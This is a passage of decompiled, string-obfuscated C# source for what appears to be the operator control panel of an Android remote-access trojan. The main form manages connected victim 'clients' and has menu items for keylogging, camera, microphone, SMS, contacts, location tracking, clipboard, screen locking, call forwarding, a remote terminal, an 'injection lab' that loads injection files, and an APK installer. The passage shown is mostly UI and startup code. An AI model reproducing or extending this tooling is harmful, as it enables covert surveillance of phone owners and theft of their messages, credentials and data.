		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cryptclmon")]
	internal virtual DataGridViewImageColumn cryptclmon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public void ServerState(string id, bool isconnected)
	{
		if (isconnected)
		{
			homeview.ExecuteScriptAsync(string.Format(EXGuarder._043C0F5B, id, 1));
		}
		else
		{
			homeview.ExecuteScriptAsync(string.Format(EXGuarder._043C0F5B, id, 0));
		}
	}

	public void ShowBlocksForServer(string serverName)
	{
		string arg = serverName.Replace(EXGuarder._443D5E41, EXGuarder._191D0951).Replace(EXGuarder._4F3F165B, EXGuarder._124D2312);
		string javaScript = string.Format(EXGuarder._70110245, arg);
		blockview.CoreWebView2.ExecuteScriptAsync(javaScript);
	}

	public void btnclicked(string btnidf)
	{
		switch (global::_003CPrivateImplementationDetails_003E.ComputeStringHash(btnidf))
		{
		case 1391791790u:
			if (Operators.CompareString(btnidf, EXGuarder._116F665D, TextCompare: false) != 0)
			{
				break;
			}
			homepanel.BringToFront();
			return;
		case 2708806455u:
			if (Operators.CompareString(btnidf, EXGuarder._55796E42, TextCompare: false) != 0)
			{
				break;
			}
			panel_DGV0.BringToFront();
			return;
		case 2554337766u:
			if (Operators.CompareString(btnidf, EXGuarder._46165039, TextCompare: false) != 0)
			{
				break;
			}
			Panel_screens.BringToFront();
			return;
		case 941431055u:
			if (Operators.CompareString(btnidf, EXGuarder._411E282C, TextCompare: false) != 0)
			{
				break;
			}
			panel_notifys.BringToFront();
			unseenNotification = 0;
			return;
		case 635123262u:
			if (Operators.CompareString(btnidf, EXGuarder._051B5E6F, TextCompare: false) != 0)
			{
				break;
			}
			panel_CONLIST.BringToFront();
			return;
		case 3816336467u:
			if (Operators.CompareString(btnidf, EXGuarder._702B281B, TextCompare: false) != 0)
			{
				break;
			}
			panel_list_block.BringToFront();
			return;
		case 1211135397u:
			if (Operators.CompareString(btnidf, EXGuarder._365B6E1C, TextCompare: false) != 0)
			{
				break;
			}
			Panel_updates.BringToFront();
			return;
		case 1258653480u:
			if (Operators.CompareString(btnidf, EXGuarder._46686610, TextCompare: false) != 0)
			{
				break;
			}
			if (settingpage != null)
			{
				return;
			}
			settingpage = new settingsfrm(AllServers);
			settingpage.ShowDialog();
			foreach (ServersInfo item in settingpage.Needrestart)
			{
				RestartServer(item);
			}
			settingpage = null;
			hideshowcolums();
			return;
		case 1650291971u:
		{
			if (Operators.CompareString(btnidf, EXGuarder._3C314127, TextCompare: false) != 0)
			{
				break;
			}
			if (jectform != null)
			{
				return;
			}
			string injections_Path = MyRes.injections_Path;
			string[] array = null;
			jectform = new ijectionlab();
			if (Directory.Exists(injections_Path))
			{
				array = Directory.GetFiles(injections_Path, EXGuarder._21375A2F);
			}
			if (array != null && array.Length > 0)
			{
				string[] array2 = array;
				foreach (string path in array2)
				{
					jectform.jectslist.Items.Add(Path.GetFileNameWithoutExtension(path));
				}
			}
			jectform.ShowDialog();
			jectform = null;
			Allinjections = codes.loadjectors(MyRes.injections_Path);
			return;
		}
		case 1406737069u:
			if (Operators.CompareString(btnidf, EXGuarder._475D6652, TextCompare: false) != 0)
			{
				break;
			}
			if (appsmanager == null)
			{
				appsmanager = new BTApps(AllServers);
				appsmanager.ShowDialog();
				appsmanager = null;
			}
			return;
		case 907671191u:
			if (Operators.CompareString(btnidf, EXGuarder._67306016, TextCompare: false) != 0)
			{
				break;
			}
			if (appsinstaller == null)
			{
				appsinstaller = new apkinstaller();
				appsinstaller.ShowDialog();
				appsinstaller = null;
			}
			return;
		}
		Interaction.MsgBox(EXGuarder._1130532C + btnidf);
	}

	private void RestartServer(ServersInfo srvinfo)
	{
		string address = srvinfo.Address;
		string sid = srvinfo.Sid;
		srvinfo.StopServer();
		AllServers.Remove(srvinfo);
		ServerState(sid, isconnected: false);
		stateview.CoreWebView2.ExecuteScriptAsync(string.Format(EXGuarder._6236652C, sid));
		foreach (BTClient value in BTEngine.clients.Values)
		{
			if (Operators.CompareString(value.Serverins.Address, address, TextCompare: false) == 0)
			{
				value.iamout();
			}
		}
	}

	public Form1()
	{
		base.Load += Form1_Load;
		base.FormClosing += Form1_FormClosing;
		AllServers = new List<ServersInfo>();
		clientPanels = new Dictionary<string, Panel>();
		Alive = true;
		Allinjections = EXGuarder._0C15116F;
		HideFlagicon = false;
		fadeSpeed = 0.02;
		_pendingConnectionLogs = new ConcurrentQueue<object[]>();
		_connectionLogFlushScheduled = 0;
		_pendingClientUpdates = new ConcurrentQueue<BTClient>();
		_clientUpdateFlushScheduled = 0;
		_pendingClients = new ConcurrentQueue<object[]>();
		_clientFlushScheduled = 0;
		locktable = RuntimeHelpers.GetObjectValue(new object());
		_pendingClientRemoves = new ConcurrentQueue<BTClient>();
		_clientRemoveFlushScheduled = 0;
		unseenNotification = 0;
		isClosingHandled = false;
		checkingnow = false;
		brushBackground = new SolidBrush(Color.FromArgb(6, 10, 15));
		brushSelected = new SolidBrush(Color.FromArgb(14, 22, 33));
		penSelected = new Pen(Color.FromArgb(14, 22, 33));
		colorDefaultFore = Color.FromArgb(145, 163, 182);
		colorSelectedFore = Color.FromArgb(2, 176, 117);
		lastState = 0;
		lastClientID = EXGuarder._31543722;
		lastMultiSignature = EXGuarder._31543722;
		_disconnectDetectorRunning = 0;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.DefaultConnectionLimit = 8;
		InitializeComponent();
		ctx_clients.Renderer = new MyRenderer();
	}

	private void SetColumnHeaders(string[] headers)
	{
		checked
		{
			int num = headers.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (i < DGV0.Columns.Count)
				{
					DGV0.Columns[i].HeaderText = headers[i];
				}
			}
		}
	}

	private void translatme()
	{
		ToolStrip_blocker.Text = BTConst.smscallblkstr;
		string _391E = EXGuarder._391E4925;
		string _391E2 = EXGuarder._391E4925;
		string _391E3 = EXGuarder._391E4925;
		string _391E4 = EXGuarder._391E4925;
		BTtiptool.SetToolTip(btnExit, BTConst.extstr);
		BTtiptool.SetToolTip(minimizbtn, BTConst.winowstr);
		BTtiptool.SetToolTip(hidbtn, BTConst.minimizestr);
		RemoteSSHToolStripMenuItem.Text = BTConst.remotsshstr;
		autounlktoolstrip.Text = BTConst.atounlkstr;
		admintoolstrip.Text = BTConst.enbladmstr;
		RemoteTelnetToolStripMenuItem.Text = BTConst.remttlntstr;
		object value = BTRegistry.GetValue(EXGuarder._3662142B, EXGuarder._08686A53);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._00535A65, TextCompare: false))
		{
			ToolStrip_manage.Text = EXGuarder._701E2F55;
			ToolStrip_files.Text = EXGuarder._5262653A;
			ToolStrip_scr.Text = EXGuarder._55401C02;
			ToolStrip_cam.Text = EXGuarder._152A3E48;
			ToolStrip_mic.Text = EXGuarder._295E2049;
			ToolStrip_msgs.Text = EXGuarder._6019235F;
			ToolStrip_contct.Text = EXGuarder._54676524;
			ToolStrip_apps.Text = EXGuarder._54192B11;
			ToolStrip_keylog.Text = EXGuarder._55554530;
			ToolStrip_brows.Text = EXGuarder._6C660D5C;
			ToolStrip_trak.Text = EXGuarder._3037054D;
			ToolStrip_chat.Text = EXGuarder._4A231057;
			ToolStrip_clipb.Text = EXGuarder._03084E6A;
			ToolStrip_conct.Text = EXGuarder._3045672B;
			ToolStrip_clifolder.Text = EXGuarder._632D0B52;
			ToolStrip_lockscr.Text = EXGuarder._1E6B2E03;
			ToolStrip_scrred.Text = EXGuarder._12343D1E;
			ToolStrip_ject.Text = EXGuarder._3F0A3B51;
			ToolStrip_tools.Text = EXGuarder._53654E0D;
			ToastToolStripMenuItem.Text = EXGuarder._414C1943;
			ToolStripMenuItem1.Text = EXGuarder._454E0F5E;
			OpenLinkToolStripMenuItem.Text = EXGuarder._66223229;
			CallPhoneToolStripMenuItem.Text = EXGuarder._394A1204;
			TerminalToolStripMenuItem.Text = EXGuarder._376B7255;
			VibrateToolStripMenuItem.Text = EXGuarder._6E2D7631;
			CallForwardingToolStripMenuItem.Text = EXGuarder._350A3605;
			ToolStripMenuItem toolStrip_conct = ToolStrip_conct;
			toolStrip_conct.DropDownItems[0].Text = EXGuarder._605B6A43;
			toolStrip_conct.DropDownItems[1].Text = EXGuarder._2C511201;
			toolStrip_conct.DropDownItems[2].Text = EXGuarder._344A163A;
			toolStrip_conct.DropDownItems[3].Text = EXGuarder._046F080A;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._55401C02,
				EXGuarder._266A714D,
				EXGuarder._4C004C61,
				EXGuarder._346C135A,
				EXGuarder._7916195A,
				EXGuarder._2C6A3A37,
				EXGuarder._6A491247,
				EXGuarder._416E6404,
				EXGuarder._4E160F3C,
				EXGuarder._265B4227,
				EXGuarder._4F781A13,
				EXGuarder._3563436E,
				EXGuarder._391E4925,
				EXGuarder._75144E07,
				EXGuarder._6B023763,
				EXGuarder._5F3E1078,
				EXGuarder._4E380F11,
				EXGuarder._4B3F270C
			});
			_391E = EXGuarder._1929184A;
			_391E2 = EXGuarder._0A1D5637;
			_391E3 = EXGuarder._07163332;
			_391E4 = EXGuarder._61356F36;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5D5F4A3E, TextCompare: false))
		{
			ToolStrip_manage.Text = EXGuarder._57330B09;
			ToolStrip_files.Text = EXGuarder._5C740B37;
			ToolStrip_scr.Text = EXGuarder._3F587050;
			ToolStrip_cam.Text = EXGuarder._486C0D74;
			ToolStrip_mic.Text = EXGuarder._5028503A;
			ToolStrip_msgs.Text = EXGuarder._5929165D;
			ToolStrip_contct.Text = EXGuarder._3976420D;
			ToolStrip_apps.Text = EXGuarder._300B6A47;
			ToolStrip_keylog.Text = EXGuarder._1E342D0B;
			ToolStrip_brows.Text = EXGuarder._30741E31;
			ToolStrip_trak.Text = EXGuarder._1C38085B;
			ToolStrip_chat.Text = EXGuarder._530E4D75;
			ToolStrip_clipb.Text = EXGuarder._6706445C;
			ToolStrip_conct.Text = EXGuarder._2D236464;
			ToolStrip_clifolder.Text = EXGuarder._21415B53;
			ToolStrip_lockscr.Text = EXGuarder._1E473F5E;
			ToolStrip_scrred.Text = EXGuarder._0A1B4C55;
			ToolStrip_ject.Text = EXGuarder._63336C49;
			ToolStrip_tools.Text = EXGuarder._33441A5E;
			ToastToolStripMenuItem.Text = EXGuarder._79724648;
			ToolStripMenuItem1.Text = EXGuarder._78763A0C;
			OpenLinkToolStripMenuItem.Text = EXGuarder._7738766F;
			CallPhoneToolStripMenuItem.Text = EXGuarder._7145630F;
			TerminalToolStripMenuItem.Text = EXGuarder._21761963;
			VibrateToolStripMenuItem.Text = EXGuarder._15125600;
			CallForwardingToolStripMenuItem.Text = EXGuarder._32742D11;
			ToolStripMenuItem toolStrip_conct2 = ToolStrip_conct;
			toolStrip_conct2.DropDownItems[0].Text = EXGuarder._445C6D5F;
			toolStrip_conct2.DropDownItems[1].Text = EXGuarder._45397711;
			toolStrip_conct2.DropDownItems[2].Text = EXGuarder._5F162E6D;
			toolStrip_conct2.DropDownItems[3].Text = EXGuarder._33586958;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._3F587050,
				EXGuarder._480F1A59,
				EXGuarder._6A164026,
				EXGuarder._4E4E644B,
				EXGuarder._5E211D55,
				EXGuarder._06632B55,
				EXGuarder._2D1E5A24,
				EXGuarder._1C38085B,
				EXGuarder._0C480B08,
				EXGuarder._2D1E5A24,
				EXGuarder._071F3A6D,
				EXGuarder._340D5446,
				EXGuarder._391E4925,
				EXGuarder._37421829,
				EXGuarder._083A6F2B,
				EXGuarder._1555416D,
				EXGuarder._3C72626D,
				EXGuarder._76674A17
			});
			_391E = EXGuarder._133A3243;
			_391E2 = EXGuarder._6055401A;
			_391E3 = EXGuarder._15714B41;
			_391E4 = EXGuarder._1736684F;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._3977793D, TextCompare: false))
		{
			ToolStrip_manage.Text = EXGuarder._4A00084C;
			ToolStrip_files.Text = EXGuarder._01552027;
			ToolStrip_scr.Text = EXGuarder._6B5C6920;
			ToolStrip_cam.Text = EXGuarder._37411074;
			ToolStrip_mic.Text = EXGuarder._6B146C04;
			ToolStrip_msgs.Text = EXGuarder._0905772C;
			ToolStrip_contct.Text = EXGuarder._346D4374;
			ToolStrip_apps.Text = EXGuarder._58745E0F;
			ToolStrip_keylog.Text = EXGuarder._5B14530E;
			ToolStrip_brows.Text = EXGuarder._556E1668;
			ToolStrip_trak.Text = EXGuarder._3C25001D;
			ToolStrip_chat.Text = EXGuarder._50693623;
			ToolStrip_clipb.Text = EXGuarder._27111523;
			ToolStrip_conct.Text = EXGuarder._423D343C;
			ToolStrip_clifolder.Text = EXGuarder._6A0B6E41;
			ToolStrip_lockscr.Text = EXGuarder._320D4C57;
			ToolStrip_scrred.Text = EXGuarder._783B6A4F;
			ToolStrip_ject.Text = EXGuarder._5654085B;
			ToolStrip_tools.Text = EXGuarder._226F025F;
			ToastToolStripMenuItem.Text = EXGuarder._0F657678;
			ToolStripMenuItem1.Text = EXGuarder._6C343978;
			OpenLinkToolStripMenuItem.Text = EXGuarder._37004141;
			CallPhoneToolStripMenuItem.Text = EXGuarder._37482C52;
			TerminalToolStripMenuItem.Text = EXGuarder._61035C03;
			VibrateToolStripMenuItem.Text = EXGuarder._4235432B;
			CallForwardingToolStripMenuItem.Text = EXGuarder._64396000;
			ToolStripMenuItem toolStrip_conct3 = ToolStrip_conct;
			toolStrip_conct3.DropDownItems[0].Text = EXGuarder._713D2825;
			toolStrip_conct3.DropDownItems[1].Text = EXGuarder._4F657522;
			toolStrip_conct3.DropDownItems[2].Text = EXGuarder._51054B09;
			toolStrip_conct3.DropDownItems[3].Text = EXGuarder._23113139;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._6B5C6920,
				EXGuarder._09136E69,
				EXGuarder._09011708,
				EXGuarder._5E2C4A4B,
				EXGuarder._05396A38,
				EXGuarder._76581771,
				EXGuarder._440C1E12,
				EXGuarder._3C25001D,
				EXGuarder._1C5C4634,
				EXGuarder._440C1E12,
				EXGuarder._195A1645,
				EXGuarder._465F0D76,
				EXGuarder._391E4925,
				EXGuarder._782A784A,
				EXGuarder._5654085B,
				EXGuarder._5F027233,
				EXGuarder._6F496852,
				EXGuarder._622B7579
			});
			_391E = EXGuarder._721B5B49;
			_391E2 = EXGuarder._2F104B61;
			_391E3 = EXGuarder._3F030C46;
			_391E4 = EXGuarder._560B005C;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5543576A, TextCompare: false))
		{
			ToolStrip_manage.Text = EXGuarder._4C4A3355;
			ToolStrip_files.Text = EXGuarder._40071317;
			ToolStrip_scr.Text = EXGuarder._21063A3E;
			ToolStrip_cam.Text = EXGuarder._2E244276;
			ToolStrip_mic.Text = EXGuarder._08234718;
			ToolStrip_msgs.Text = EXGuarder._1C54094E;
			ToolStrip_contct.Text = EXGuarder._18622873;
			ToolStrip_apps.Text = EXGuarder._0C0D4037;
			ToolStrip_keylog.Text = EXGuarder._47561147;
			ToolStrip_brows.Text = EXGuarder._176B0F5A;
			ToolStrip_trak.Text = EXGuarder._39755954;
			ToolStrip_chat.Text = EXGuarder._72580129;
			ToolStrip_clipb.Text = EXGuarder._394C3206;
			ToolStrip_conct.Text = EXGuarder._201B0F63;
			ToolStrip_clifolder.Text = EXGuarder._2B054315;
			ToolStrip_lockscr.Text = EXGuarder._1F724958;
			ToolStrip_scrred.Text = EXGuarder._67685A54;
			ToolStrip_ject.Text = EXGuarder._62623704;
			ToolStrip_tools.Text = EXGuarder._55442520;
			ToastToolStripMenuItem.Text = EXGuarder._290A6116;
			ToolStripMenuItem1.Text = EXGuarder._6A6C7368;
			OpenLinkToolStripMenuItem.Text = EXGuarder._541A015B;
			CallPhoneToolStripMenuItem.Text = EXGuarder._20342136;
			TerminalToolStripMenuItem.Text = EXGuarder._753B5B67;
			VibrateToolStripMenuItem.Text = EXGuarder._3E731307;
			CallForwardingToolStripMenuItem.Text = EXGuarder._6A20021F;
			ToolStripMenuItem toolStrip_conct4 = ToolStrip_conct;
			toolStrip_conct4.DropDownItems[0].Text = EXGuarder._096B3403;
			toolStrip_conct4.DropDownItems[1].Text = EXGuarder._210C2231;
			toolStrip_conct4.DropDownItems[2].Text = EXGuarder._652D4840;
			toolStrip_conct4.DropDownItems[3].Text = EXGuarder._7436325A;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._21063A3E,
				EXGuarder._67752A6D,
				EXGuarder._60682847,
				EXGuarder._44616971,
				EXGuarder._124C7439,
				EXGuarder._00304B63,
				EXGuarder._49280513,
				EXGuarder._39755954,
				EXGuarder._1B1B3011,
				EXGuarder._49280513,
				EXGuarder._3B086A19,
				EXGuarder._5B3D1C79,
				EXGuarder._391E4925,
				EXGuarder._4257623E,
				EXGuarder._62623704,
				EXGuarder._08381420,
				EXGuarder._74275156,
				EXGuarder._34675168
			});
			_391E = EXGuarder._144D6258;
			_391E2 = EXGuarder._2864633C;
			_391E3 = EXGuarder._2D744B11;
			_391E4 = EXGuarder._0F243F32;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6B630509, TextCompare: false))
		{
			ToolStrip_manage.Text = EXGuarder._724E3C1E;
			ToolStrip_files.Text = EXGuarder._48535711;
			ToolStrip_scr.Text = EXGuarder._55691561;
			ToolStrip_cam.Text = EXGuarder._69506E51;
			ToolStrip_mic.Text = EXGuarder._1F6A5B31;
			ToolStrip_msgs.Text = EXGuarder._46285D78;
			ToolStrip_contct.Text = EXGuarder._75081C5B;
			ToolStrip_apps.Text = EXGuarder._0E0D4761;
			ToolStrip_keylog.Text = EXGuarder._47561147;
			ToolStrip_brows.Text = EXGuarder._6C067313;
			ToolStrip_trak.Text = EXGuarder._36204C1E;
			ToolStrip_chat.Text = EXGuarder._0120376E;
			ToolStrip_clipb.Text = EXGuarder._06413E48;
			ToolStrip_conct.Text = EXGuarder._6A287965;
			ToolStrip_clifolder.Text = EXGuarder._0614510C;
			ToolStrip_lockscr.Text = EXGuarder._2B652969;
			ToolStrip_scrred.Text = EXGuarder._38213507;
			ToolStrip_ject.Text = EXGuarder._27347915;
			ToolStrip_tools.Text = EXGuarder._6B461518;
			ToastToolStripMenuItem.Text = EXGuarder._2B4C7212;
			ToolStripMenuItem1.Text = EXGuarder._5203105F;
			OpenLinkToolStripMenuItem.Text = EXGuarder._6D2A0527;
			CallPhoneToolStripMenuItem.Text = EXGuarder._0A0E652D;
			TerminalToolStripMenuItem.Text = EXGuarder._174A6059;
			VibrateToolStripMenuItem.Text = EXGuarder._5D546B6F;
			CallForwardingToolStripMenuItem.Text = EXGuarder._5E423E28;
			ToolStripMenuItem toolStrip_conct5 = ToolStrip_conct;
			toolStrip_conct5.DropDownItems[0].Text = EXGuarder._0A660878;
			toolStrip_conct5.DropDownItems[1].Text = EXGuarder._42335B58;
			toolStrip_conct5.DropDownItems[2].Text = EXGuarder._336C6E6A;
			toolStrip_conct5.DropDownItems[3].Text = EXGuarder._1C6B3426;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._55691561,
				EXGuarder._65291A2C,
				EXGuarder._4A360819,
				EXGuarder._01605357,
				EXGuarder._18517045,
				EXGuarder._323E3E2A,
				EXGuarder._3E061507,
				EXGuarder._3C0A4417,
				EXGuarder._66401A3A,
				EXGuarder._3E061507,
				EXGuarder._79164F5F,
				EXGuarder._47417408,
				EXGuarder._391E4925,
				EXGuarder._06593332,
				EXGuarder._27347915,
				EXGuarder._31070B0F,
				EXGuarder._3F05701D,
				EXGuarder._0D46401D
			});
			_391E = EXGuarder._2A077427;
			_391E2 = EXGuarder._46026E1D;
			_391E3 = EXGuarder._78707745;
			_391E4 = EXGuarder._0B756451;
		}
		else
		{
			if (!Operators.ConditionalCompareObjectEqual(value, EXGuarder._00643111, TextCompare: false))
			{
				_391E = EXGuarder._3B167945;
				_391E2 = EXGuarder._1E5B742A;
				_391E3 = EXGuarder._2E705C32;
				_391E4 = EXGuarder._784E6A08;
				return;
			}
			ToolStrip_manage.Text = EXGuarder._724E3C1E;
			ToolStrip_files.Text = EXGuarder._713B0D56;
			ToolStrip_scr.Text = EXGuarder._27541559;
			ToolStrip_cam.Text = EXGuarder._164F0556;
			ToolStrip_mic.Text = EXGuarder._1D1A7303;
			ToolStrip_msgs.Text = EXGuarder._41090058;
			ToolStrip_contct.Text = EXGuarder._4B482204;
			ToolStrip_apps.Text = EXGuarder._0F6C2D05;
			ToolStrip_keylog.Text = EXGuarder._47561147;
			ToolStrip_brows.Text = EXGuarder._6C067313;
			ToolStrip_trak.Text = EXGuarder._516B3C45;
			ToolStrip_chat.Text = EXGuarder._6514732F;
			ToolStrip_clipb.Text = EXGuarder._06413E48;
			ToolStrip_conct.Text = EXGuarder._470F7335;
			ToolStrip_clifolder.Text = EXGuarder._0D2B5053;
			ToolStrip_lockscr.Text = EXGuarder._0A323A0A;
			ToolStrip_scrred.Text = EXGuarder._11354726;
			ToolStrip_ject.Text = EXGuarder._42692833;
			ToolStrip_tools.Text = EXGuarder._5D425B47;
			ToastToolStripMenuItem.Text = EXGuarder._4C610424;
			ToolStripMenuItem1.Text = EXGuarder._320F000E;
			OpenLinkToolStripMenuItem.Text = EXGuarder._1E645D1E;
			CallPhoneToolStripMenuItem.Text = EXGuarder._5246380B;
			TerminalToolStripMenuItem.Text = EXGuarder._174A6059;
			VibrateToolStripMenuItem.Text = EXGuarder._731B4615;
			CallForwardingToolStripMenuItem.Text = EXGuarder._49474E3F;
			ToolStripMenuItem toolStrip_conct6 = ToolStrip_conct;
			toolStrip_conct6.DropDownItems[0].Text = EXGuarder._3A157705;
			toolStrip_conct6.DropDownItems[1].Text = EXGuarder._42335B58;
			toolStrip_conct6.DropDownItems[2].Text = EXGuarder._70442711;
			toolStrip_conct6.DropDownItems[3].Text = EXGuarder._2D11132E;
			SetColumnHeaders(new string[18]
			{
				EXGuarder._27541559,
				EXGuarder._062D664F,
				EXGuarder._2B6C544F,
				EXGuarder._1F683723,
				EXGuarder._18517045,
				EXGuarder._243B6E2A,
				EXGuarder._05651216,
				EXGuarder._516B3C45,
				EXGuarder._66401A3A,
				EXGuarder._05651216,
				EXGuarder._5348312C,
				EXGuarder._722C702F,
				EXGuarder._391E4925,
				EXGuarder._26603030,
				EXGuarder._42692833,
				EXGuarder._4A301024,
				EXGuarder._2A383D73,
				EXGuarder._514A4B4E
			});
			_391E = EXGuarder._2A077427;
			_391E2 = EXGuarder._46026E1D;
			_391E3 = EXGuarder._65525870;
			_391E4 = EXGuarder._30233608;
		}
		ToolStrip_edits.Text = _391E;
		ToolStripMenuItem toolStrip_edits = ToolStrip_edits;
		toolStrip_edits.DropDownItems[0].Text = _391E2;
		toolStrip_edits.DropDownItems[1].Text = _391E3;
		toolStrip_edits.DropDownItems[2].Text = _391E4;
	}

	public void AddtoScreens(string clientID, string clienttitle, Bitmap avatarPath, Bitmap imagePath)
	{
		if (!clientPanels.ContainsKey(clientID))
		{
			Panel panel = new Panel();
			panel.Width = 240;
			panel.Height = 350;
			panel.Margin = new Padding(10);
			panel.BorderStyle = BorderStyle.FixedSingle;
			Panel panel2 = new Panel();
			panel2.Dock = DockStyle.Top;
			panel2.Height = 100;
			PictureBox pictureBox = new PictureBox();
			pictureBox.Image = avatarPath;
			pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox.Width = 45;
			pictureBox.Height = 45;
			pictureBox.Left = checked((int)Math.Round((double)(panel2.Width - pictureBox.Width) / 2.0));
			pictureBox.Top = 10;
			pictureBox.Dock = DockStyle.Left;
			Label label = new Label();
			label.Text = clientID;
			label.AutoSize = false;
			label.Width = panel2.Width;
			label.Height = 30;
			label.TextAlign = ContentAlignment.MiddleCenter;
			label.Dock = DockStyle.Fill;
			panel2.Controls.Add(pictureBox);
			panel2.Controls.Add(label);
			PictureBox pictureBox2 = new PictureBox();
			pictureBox2.Image = imagePath;
			pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox2.Dock = DockStyle.Fill;
			panel.Controls.Add(pictureBox2);
			panel.Controls.Add(panel2);
			FlowLayoutPanel1.Controls.Add(panel);
			clientPanels.Add(clientID, panel);
		}
	}

	public void RemoveScreens(string clientID)
	{
		if (clientPanels.ContainsKey(clientID))
		{
			Panel value = clientPanels[clientID];
			FlowLayoutPanel1.Controls.Remove(value);
			clientPanels.Remove(clientID);
		}
	}

	public void UpdateScreen(string clientID, Bitmap newImagePath)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				UpdateScreen(clientID, newImagePath);
			}));
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (BTRegistry.ReadBool(EXGuarder._4F156964) || MyMsg.Show(BTConst.myname, BTConst.wannaexit, MyMsg.msgtype.errors, use_no: true, showskip: true, EXGuarder._4F156964) == DialogResult.OK)
		{
			Close();
		}
	}

	public void RestartAppWithDelay()
	{
		try
		{
			string executablePath = Application.ExecutablePath;
			string text = string.Format(EXGuarder._5F3C2315, executablePath);
			Process process = new Process();
			process.StartInfo.FileName = EXGuarder._775F3D3F;
			process.StartInfo.Arguments = EXGuarder._4E496526 + text;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		Visible = false;
		Opacity = 0.0;
		string currentlang = codes.locallanguage();
		if (!Directory.Exists(MyRes.Resources_Path))
		{
			MyMsg.Show(BTConst.resfoldermissing, BTConst.resmismsgstr, MyMsg.msgtype.Confirm, use_no: false);
			Environment.Exit(0);
		}
		if (!Directory.Exists(MyRes.BTKeys_path))
		{
			Directory.CreateDirectory(MyRes.BTKeys_path);
		}
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), BTConst.myname);
		BTConst.Sign_Private_Key_Path = Path.Combine(path, "private_sign.key");
		BTConst.Sign_Public_Key_Path = Path.Combine(path, "public_sign.key");
		BTConst.Exchange_Private_Key_Path = Path.Combine(path, "private_exchange.key");
		BTConst.Exchange_Public_Key_Path = Path.Combine(path, "public_exchange.key");
		if (!File.Exists(BTConst.Sign_Private_Key_Path) || !File.Exists(BTConst.Sign_Public_Key_Path) || !File.Exists(BTConst.Exchange_Private_Key_Path) || !File.Exists(BTConst.Exchange_Public_Key_Path))
		{
			Securekey securekey = new Securekey();
			if (securekey.ShowDialog() != DialogResult.OK)
			{
				Environment.Exit(0);
			}
		}
		splash = new SplashForm(this);
		splash.Show();
		splash.BringToFront();
		splash.Owner = this;
		Application.DoEvents();
		do
		{
			await Task.Delay(1000);
		}
		while (!splash.weready);
		await SplashStepAsync(splash, $"{BTConst.inilizwindstr}...");
		InitFormBasics();
		await SplashStepAsync(splash, $"{BTConst.loadfimgstr}...");
		InitFlagsImages();
		await SplashStepAsync(splash, $"{BTConst.conftblvstr}...");
		InitDataGridView();
		await SplashStepAsync(splash, $"{BTConst.lodcnfgstr}...");
		codes.CheckDefaultOptions();
		Allinjections = codes.loadjectors(MyRes.injections_Path);
		await SplashStepAsync(splash, $"{BTConst.iransuistr}...");
		translatme();
		await SplashStepAsync(splash, $"{BTConst.strtbacksrvstr}...");
		StartBackgroundServices();
		await SplashStepAsync(splash, $"{BTConst.preminwinstr}...");
		ActiveControl = DGV0;
		await SplashStepAsync(splash, $"{BTConst.initminwbstr}...");
		await InitMainWebViewAsync();
		await SplashStepAsync(splash, $"{BTConst.prepwebvstr}...");
		JsBridge jsBridge = new JsBridge(this);
		await EnsureAllWebViewsAsync();
		await SplashStepAsync(splash, $"{BTConst.loaduistr}...");
		InitUpdateView(currentlang);
		InitBlockView(currentlang);
		InitConView(currentlang);
		InitNotifyView(currentlang);
		InitNavView(currentlang);
		InitStateView();
		InitTopClientsView(currentlang);
		await InitHomeViewAsync(currentlang);
		await InitBarViewAsync(jsBridge);
		await SplashStepAsync(splash, $"{BTConst.finlizstr}...");
		contimer.Start();
		splash.ShowContinueButton();
		await SplashStepAsync(splash, $"{BTConst.readystr}");
		Visible = true;
	}

	private async Task SplashStepAsync(SplashForm splash, string message)
	{
		splash.UpdateStatus(message);
		Application.DoEvents();
		await Task.Delay(100);
	}

	private void InitFormBasics()
	{
		_resizablePanel = new ResizeableControl(panel_notifys);
		_resizablePanel.AllowedEdge = ResizeableControl.EdgeEnum.Top;
		DoubleBuffered = true;
		start_W = base.Width;
		start_H = base.Height;
		startstamp = DateAndTime.Now.ToShortTimeString().ToString();
		BTEngine.MainForm = this;
		base.Bounds = Screen.PrimaryScreen.WorkingArea;
		homepanel.BringToFront();
		base.Tag = true;
		start_barvwidth = barview.Width;
		Flags_images = new ImageList();
		hideshowcolums();
		StartDisconnectDetector();
		statestimer.Interval = GetStatusTimerInterval();
		contimer.Interval = GetConnectionTimerInterval();
		StartServerPinger();
	}

	private int GetConnectionTimerInterval()
	{
		object value = BTRegistry.GetValue(EXGuarder._71056A5D, EXGuarder._0F652523);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._002E1B59, TextCompare: false))
		{
			return 5000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._0F652523, TextCompare: false))
		{
			return 3000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._526D714D, TextCompare: false))
		{
			return 1000;
		}
		return 1500;
	}

	private string GetPreformStr()
	{
		object value = BTRegistry.GetValue(EXGuarder._0207480A, EXGuarder._34527639);
